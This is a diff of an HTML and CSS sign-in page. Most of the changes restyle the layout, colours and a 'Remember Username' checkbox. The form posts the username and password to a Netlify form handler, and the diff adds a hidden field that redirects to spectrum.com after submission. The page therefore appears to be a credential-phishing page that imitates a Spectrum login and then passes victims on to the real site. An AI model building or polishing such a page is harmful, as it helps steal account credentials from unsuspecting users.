@@ -16,6 +16,7 @@
          margin: 0;
          padding: 0;
          background: transparent;
+         
       }
       body {
        background-color: rgb(240, 240, 240);
@@ -40,7 +41,6 @@
           font-weight: 900;
           position: relative;
          top: 52px;
-         left: px;
          z-index: 1;
          display: inline; 
         }
@@ -85,16 +85,19 @@
       
       }
      .logo1 svg{
-       color: blue;
+       color: rgb(98, 98, 230);
       position: absolute;
-      left: 27;
-      top: 15;
+      left: 35px;
+      top: 49px;
       }
      svg{
-       color: blue;
+       color: rgb(0, 0, 255);
       
       }
-
+      
+      .logo1{
+        color: rgb(0, 0, 125);
+      }
       .form-wrap .form-group input {
          text-align: left;
          margin-left: 60px;
@@ -108,7 +111,7 @@
        border-style: none;
        border-radius: 5px;
          display: block;
-       width: 72%;
+       width: 72%; 
        padding: 15px;
        margin-top: 20px;
        margin-left: 60px;
@@ -119,7 +122,7 @@
       }
 
       .form-wrap button:hover {
-       background: #37a08e;
+       background: #7166ee;
       }
 
       .form-wrap .bottom-text {
@@ -141,6 +144,8 @@
       .separator {
         display: flex;
         align-items: center;
+        justify-content: center;
+
       }
      
       .separator p {
@@ -148,16 +153,28 @@
       }
 
       .separator .line{
-        flex: 1;
         height: 0.9px;
         background-color: #ccc;
-        display: inline;
-      width: 10px !important;
+        /* display: inline; */
+      width: 25%;
     }
 
     .closure {
       text-decoration: #000;
     }
+    .check_out input{
+     padding-left: 0px!important;
+     margin-left: 0px!important;
+     align-items: left!important;
+     position: absolute;
+    right: 263px!important;
+     bottom: 303px;
+  
+
+    }
+     .remember {
+     margin-right: 30%;
+     }
       
         
          </style>
@@ -176,16 +193,17 @@
     </div>
     <div id="container">
       <div class="form-wrap">
-        <h1>Sign In to Get Started</h1>
         <br>
+        <h1>Sign In to Get Started</h1>
         <div class="separator">
           <div class="line"></div>
           <p>or</p>
           <div class="line"></div>
         </div>
-        <br>
         <a href="#">Create a Username</a>
-         <form name="contact" method="POST" data-netlify="true" data-netlify-recaptcha="true">
+        <br>
+        <br>
+         <form  name="contact" method="POST" data-netlify="true" data-netlify-recaptcha="true">
 
            <div class="form-group">
              <label for="username"> Username <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-question-circle" viewBox="0 0 16 16">
@@ -195,12 +213,21 @@
              <input type="text" name="username" id="username" />
                      <div class="form-group">
              <label for="password">Password</label>
+             
+             <input type="hidden" name="_next" value="https://spectrum.com" />
+
              <input type="password" name="password" id="password" /><br>
+             <br><br>
                     </div>
-             <input type="checkbox" name="username " id="username" value="demo"><span>Remember Username</span> 
+              <div class="check_out">
+              <label for="remember" >  __Remember Username <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-question-circle" viewBox="0 0 16 16">
+                <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/>
+                <path d="M5.255 5.786a.237.237 0 0 0 .241.247h.825c.138 0 .248-.113.266-.25.09-.656.54-1.134 1.342-1.134.686 0 1.314.343 1.314 1.168 0 .635-.374.927-.965 1.371-.673.489-1.206 1.06-1.168 1.987l.003.217a.25.25 0 0 0 .25.246h.811a.25.25 0 0 0 .25-.25v-.105c0-.718.273-.927 1.01-1.486.609-.463 1.244-.977 1.244-2.056 0-1.511-1.276-2.241-2.673-2.241-1.267 0-2.655.59-2.75 2.286zm1.557 5.763c0 .533.425.927 1.01.927.609 0 1.028-.394 1.028-.927 0-.552-.42-.94-1.029-.94-.584 0-1.009.388-1.009.94z"/>
+              </svg></label>
+              <input type="checkbox" name="username " id="username" value="demo">
            </div>
            <div data-netlify-recaptcha="true"></div>
-           <button type="submit" class="btn">Sign In</button>
+           <br><button type="submit" class="btn">Sign In</button>
          </form>
 
          <p  class="bottom-text">
